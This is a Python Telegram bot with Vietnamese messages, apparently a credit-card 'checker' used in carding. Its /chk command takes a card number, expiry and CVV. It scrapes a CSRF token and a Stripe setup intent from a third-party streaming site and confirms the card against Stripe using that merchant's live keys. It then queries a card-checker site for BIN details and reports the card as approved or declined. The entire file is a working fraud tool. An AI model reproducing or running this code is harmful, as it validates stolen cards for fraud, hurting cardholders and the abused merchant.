import requests, re, time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bs4 import BeautifulSoup

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Không có quyền sử dụng bot này.")
        return

    if not context.args:
        await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
        return

    raw = context.args[0]
    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{4})\|(\d{3,4})$', raw)

    if not match:
        await update.message.reply_text("❌ Sai cú pháp.")
        return

    cc, mes, ano, cvv = match.groups()
    bin_code = cc[:6]
    await update.message.reply_text("🕐 Đang kiểm tra...")
    start_time = time.time()

    try:
        # Bước 1: Lấy CSRF token
        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
        soup = BeautifulSoup(r1.text, "html.parser")
        token = soup.find("meta", {"name": "csrf-token"})["content"]

        # Bước 2: Lấy setup_intent
        r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
        json2 = r2.json()
        setid = json2["setup_intent"]
        setin = setid.split("_secret_")[0]

        # Bước 3: Xác nhận
        payload = {
            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": "VN",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/155bc2c263; stripe-js-v3/155bc2c263; payment-element",
            "payment_method_data[referrer]": "https://urbanflixtv.com",
            "payment_method_data[time_on_page]": "20923",
            "payment_method_data[client_attribution_metadata][client_session_id]": "487a05d5-8c48-488f-a3ab-e8de179fc4ef",
            "payment_method_data[guid]": "40a664fd-df2e-4b44-92e3-0476c602e58a96f58e",
            "payment_method_data[muid]": "c4954d5a-d300-446d-8144-a7c65563cbac3f9142",
            "payment_method_data[sid]": "6147f14c-a06f-420c-a782-594d676d8a2a332b9d",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
            "client_secret": setid
        }

        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
        j3 = r3.json()

        status = j3.get("status", "UNKNOWN")
        decline = j3.get("error", {}).get("decline_code", "NONE")

        # BIN lookup
        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "*/*",
            "Pragma": "no-cache"
        })
        bin_json = bin_res.json()

        card = bin_json.get("scheme", "N/A")
        type_ = bin_json.get("type", "N/A")
        brand = bin_json.get("brand", "N/A")
        alpha2 = bin_json.get("alpha2", "N/A")
        name = bin_json.get("name", "")
        bank = name.split(", ")[0] if ", " in name else name

        elapsed = round(time.time() - start_time, 2)

        msg = f"""
<b>✅ CHECK RESULT</b>

<b>CC:</b> {cc}|{mes}|{ano}|{cvv}
<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}

<b>Gateway:</b> Stripe
<b>Card:</b> {card.upper()}
<b>Type:</b> {type_.capitalize()}
<b>Brand:</b> {brand}
<b>Alpha2:</b> {alpha2}
<b>Bank:</b> {bank}

<b>Took:</b> {elapsed} sec
<b>Checked by:</b> mnhat [5127429005]
"""
        await update.message.reply_html(msg)

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi xử lý: {str(e)}")
